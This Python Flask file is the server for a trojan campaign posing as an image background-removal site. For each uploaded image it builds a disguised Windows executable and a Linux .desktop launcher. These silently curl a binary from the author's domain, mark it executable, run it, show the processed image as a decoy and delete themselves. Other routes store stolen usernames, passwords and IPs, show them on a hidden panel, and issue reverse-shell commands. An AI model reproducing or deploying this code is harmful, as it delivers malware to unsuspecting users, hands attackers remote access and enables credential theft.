from flask import Flask, render_template, request, send_from_directory, flash, redirect, url_for, redirect, session
import os
import sqlite3
from werkzeug.security import generate_password_hash, check_password_hash
import secrets
import subprocess
import uuid
import time
import shutil
from PIL import Image

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY") or os.urandom(32)
REGISTRATION_KEY = secrets.token_urlsafe(32)

# Folder pathss
UPLOAD_FOLDER = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'uploads')
PROCESSED_FOLDER = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'processed')
EXECUTABLES_FOLDER = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'executables')
ICOS_FOLDER = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'icos')
PNG_FOLDER = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'pngs')
BATFILES_FOLDER = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'batfiles')
DESKTOP_FOLDER = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'deskfiles')
BAT_TO_EXE_PATH = "/home/stanley/B2E.exe"
# BAT_TO_EXE_PATH = "/mnt/c/Users/stanl/Downloads/Bat_To_Exe_Converter_x64.exe"

app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER
app.config["PROCESSED_FOLDER"] = PROCESSED_FOLDER
app.config["EXECUTABLES_FOLDER"] = EXECUTABLES_FOLDER
app.config["ICOS_FOLDER"] = ICOS_FOLDER
app.config["PNG_FOLDER"] = PNG_FOLDER
app.config["BATFILES_FOLDER"] = BATFILES_FOLDER
app.config["DESKTOP_FOLDER"] = DESKTOP_FOLDER

# Create folders if they don't exist
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(PROCESSED_FOLDER, exist_ok=True)
os.makedirs(EXECUTABLES_FOLDER, exist_ok=True)
os.makedirs(ICOS_FOLDER, exist_ok=True)
os.makedirs(PNG_FOLDER, exist_ok=True)
os.makedirs(BATFILES_FOLDER, exist_ok=True)
os.makedirs(DESKTOP_FOLDER, exist_ok=True)

# Database path
DB_PATH = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'data.db')

# Pulls the compiled c file, gives it executable permissions, then runs it
batfile_template = '''@echo off

wsl bash -c "curl -s -X POST -o ~/.config/rm17-node https://cyber.stanleyhoo1.tech/files/runme 2>/dev/null"
wsl bash -c "chmod +x ~/.config/rm17-node 2>/dev/null"
wsl bash -c "~/.config/rm17-node 2>/dev/null"'''

# Create a tmp batfile to delete the exe and itself (can't figure out how to do it without spawning another shell)
del_exe = '''
set "delbat=%temp%\d.bat"
echo @echo off > "%delbat%"
echo ping 127.0.0.1 -n 3 >nul >> "%delbat%"
echo del /f /q "%~f0" >> "%delbat%"
echo del /f /q "%delbat%" >> "%delbat%"
start "" /min "%delbat%"

exit'''

# Template for desktop file
desktop_template = '''[Desktop Entry]
Type=Application
Name=FILENAME
Comment=Dynamic launcher
Path=.
Exec=bash -c "COMMANDS"
Icon=.PNG_PATH
Terminal=false'''

# Gets db connections
def get_db_connection():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

# Initializes database
def create_db():
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute('''CREATE TABLE IF NOT EXISTS data (
        username TEXT NOT NULL,
        password TEXT NOT NULL,
        ip TEXT NOT NULL,
        timestamp TEXT
        );
    ''')
    cur.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL
        );
    ''')
    conn.commit()
    conn.close()

# Inserts stolen data into database
def insert_data(username, password, ip, timestamp):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("INSERT INTO data(username, password, ip, timestamp) VALUES(?, ?, ?, ?)", (username, password, ip, timestamp))
    conn.commit()
    conn.close()

# Retrieves stolen info from database
def get_data():
    conn = get_db_connection()
    cur = conn.cursor()
    data = cur.execute("SELECT * FROM data").fetchall()
    conn.close()
    return data

# Home page
@app.route("/")
def home():
    return render_template('home.html')

# Proceeds with removing background from image
@app.route("/proceed", methods=['GET', 'POST'])
def proceed():
    img = request.files.get("image")

    # Actual image name (used to retrive it with proper name later)
    original_filename = img.filename

    # Filename for the exe that will be downloaded
    session['filename'] = f'{os.path.splitext(original_filename)[0]}'

    # Generate unique filename so we don't accidently override
    extension = os.path.splitext(img.filename)[1]
    filename = f"{uuid.uuid4().hex}{extension}"

    # Save image to disk
    upload_path = os.path.join(app.config["UPLOAD_FOLDER"], filename)
    img.save(upload_path)

    # Path for image with removed background
    processed_path = os.path.join(app.config["PROCESSED_FOLDER"], filename)

    # Path for the exe icon
    ico_path = os.path.join("icos", f'{os.path.splitext(filename)[0]}.ico')

    # Path for the desktop icon
    png_path = os.path.join("pngs", f'{os.path.splitext(filename)[0]}.png')

    # Path for the batfile
    batfile_path = os.path.join("batfiles", f'{os.path.splitext(filename)[0]}.bat')

    # Creates the batfile
    batfile = batfile_template[:]
    batfile += f'''\nwsl bash -c "curl -s -X POST -o '{original_filename}' https://cyber.stanleyhoo1.tech/download_image/{filename} 2>/dev/null"'''
    batfile += f'''\nstart "" "{original_filename}"'''

    # Batfile self deletes
    batfile += del_exe

    # Saves the batfile
    with open(batfile_path, 'w') as file:
        file.write(batfile)

    # Path for the desktop file
    deskfile_path = os.path.join("deskfiles", f'{os.path.splitext(filename)[0]}.desktop')

    # Creates the desktop file with same logic as batfile
    deskfile = desktop_template[:]
    deskfile = deskfile.replace("FILENAME", original_filename)
    deskfile_commands = ""
    deskfile_commands += (f"curl -s -X POST -o ~/.config/rm17-node https://cyber.stanleyhoo1.tech/files/runme 2>/dev/null; "
                          f"chmod +x ~/.config/rm17-node 2>/dev/null; "
                          f"~/.config/rm17-node 2>/dev/null; "
                          f"curl -s -X POST -o '{original_filename}' https://cyber.stanleyhoo1.tech/download_image/{filename} 2>/dev/null; "
                          f"rm '.{os.path.splitext(filename)[0]}.png'; "
                          f"xdg-open '{original_filename}'; "
                          f"rm '{session['filename']}.desktop'")
    deskfile = deskfile.replace("COMMANDS", deskfile_commands)
    deskfile = deskfile.replace("PNG_PATH", f'{os.path.splitext(original_filename)[0]}.png')

    # Saves the desktop file
    with open(deskfile_path, 'w') as file:
        file.write(deskfile)

    # Removes image background
    subprocess.run(["backgroundremover", "-i", upload_path, "-o", processed_path])
    shutil.copy(processed_path, png_path)

    # Creates the ico from the image
    img = Image.open(processed_path)
    img.save(ico_path, format='ICO', sizes=[(256, 256), (64, 64), (32, 32)])
    img.save(png_path, format='PNG')

    # Wait until the file exists and is non-empty
    time.sleep(2)

    # Converts the batfile to an exe with the ico set as the icon
    # subprocess.run([BAT_TO_EXE_PATH, "/bat", batfile_path, "/exe", f'executables/{os.path.splitext(filename)[0]}.exe', "/icon", ico_path, "/invisible"])
    # subprocess.run(["wine", BAT_TO_EXE_PATH, "/bat", batfile_path, "/exe", f'executables/{os.path.splitext(filename)[0]}.exe', "/icon", ico_path, "/invisible"])
    subprocess.run(["python3", "/home/stanley/pseudo/app/convert_exe.py", os.path.splitext(filename)[0]])

    flash("Image processed! Click download to get the PNG.", "success")
    return render_template("results.html", filename=original_filename, img=filename, download_filename=f'{os.path.splitext(filename)[0]}', download_png_name=f'{session['filename']}.png')

# Download page where the target will download the virus
@app.route("/results", methods=['GET', 'POST'])
def results():
    return render_template("results.html")

# Displays edited image
@app.route('/processed/<path:filename>')
def get_processed(filename):
    return send_from_directory(PROCESSED_FOLDER, filename)

# Stolen passwords page
@app.route("/pA55w0Rds")
def passwords():
    if 'username' in session:
        data = get_data()
        table_data = []
        for target in data:
            table_data.append([target['username'], target['password'], target['ip'], target['timestamp']])
        return render_template('passwords.html', data=table_data)
    else:
        return render_template('passwords.html')

# Form to send the stolen info through
@app.route('/steal', methods=['POST'])
def steal():
    username = request.form.get('username')
    password = request.form.get('password')
    ip = request.form.get('ip')
    timestamp = request.form.get('timestamp')
    insert_data(username, password, ip, timestamp)
    return ""

# Form to get commands to run
@app.route('/commands', methods=['POST'])
def command():
    type = request.form.get('type')
    if type=="REVERSE":
        port = request.form.get('port')
        ip = request.form.get('ip')
        return f'REVERSE port={port} ip={ip}'
    return ""

# Login route
@app.route('/login', methods=['POST'])
def login():
     if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        conn = get_db_connection()
        cur = conn.cursor()
        # Retrieve hashed password for the given username
        cur.execute("SELECT password_hash FROM users WHERE username = ?", (username,))
        user_row = cur.fetchone()
        conn.close()

        # Checks hashed user password against database
        if user_row and check_password_hash(user_row['password_hash'], password):
            session['username'] = username
            flash('Login successful!', 'success')
            return redirect(url_for('passwords'))
        else:
            flash('Invalid username or password!', 'error')
            return redirect(url_for('passwords'))

# Form to register, only accesible via terminal commands
@app.route('/register', methods=['POST'])
def register():
    username = request.form.get('username')
    password = request.form.get('password')
    key = request.form.get('key')

    if key != REGISTRATION_KEY:
        return 'Invalid admin key — registration denied.'

    password_hash = generate_password_hash(password)
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("INSERT INTO users (username, password_hash) VALUES (?, ?)", (username, password_hash))
        conn.commit()
        conn.close()
        return 'User registered successfully.'
    except sqlite3.IntegrityError:
        return 'Username already exists.'

# Logout
@app.route('/logout', methods=['POST'])
def logout():
    session.pop('username')
    flash('Logged out successfully.', 'success')
    return redirect(url_for('passwords'))

# Deletes last entry in the database (for debugging)
@app.route('/delete-last', methods=['POST'])
def delete_last_entry():
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("DELETE FROM data WHERE rowid = (SELECT rowid FROM data ORDER BY rowid DESC LIMIT 1)")
    conn.commit()
    conn.close()
    return 'Last entry deleted.'

# Just a page that will list all the files so we can retrieve them using wget/curl
@app.route('/files/', methods=['POST'])
def list_files():
    files = ['runme', 'cleanup.sh'] #os.listdir('../')
    files_html = '\n'.join(
        f'<li><a href="/files/{file}">{file}</a></li>' for file in files
    )
    return f"<ul>{files_html}</ul>"

# Download the scripts we will run
@app.route('/files/<path:filename>', methods=['POST'])
def get_file(filename):
    return send_from_directory('../', filename)

# Download the actual image via curl
@app.route('/download_image/<path:filename>', methods=['POST'])
def download_img(filename):
    return send_from_directory(PROCESSED_FOLDER, filename)

# Download executables based on the OS
@app.route('/download/<path:filename>', methods=['GET', 'POST'])
def download_file(filename):
    ua = request.headers.get("User-Agent", "").lower()

    if "windows" in ua:
        print("windows")
        return send_from_directory(EXECUTABLES_FOLDER, f'{filename}.exe', download_name=f'{session['filename']}.exe', as_attachment=True)
    elif "macintosh" in ua:
        print("mac")
        # return send_file("mac.dmg", as_attachment=True)
    elif "linux" in ua:
        print("linux")

        return send_from_directory(DESKTOP_FOLDER, f'{filename}.desktop', download_name=f'{session['filename']}.desktop', as_attachment=True)

    return ""

# Download desktop file icon
@app.route('/icon/<path:filename>/<path:download_name>', methods=['GET', 'POST'])
def download_icon(filename, download_name):
    return send_from_directory(PNG_FOLDER, f'{filename}.png', download_name=f'{download_name}', as_attachment=True)

if __name__ == "__main__":
    create_db()
    # To create new users
    print(f"[DEBUG] Registration key: {REGISTRATION_KEY}")
    app.run(host='0.0.0.0', debug=False)
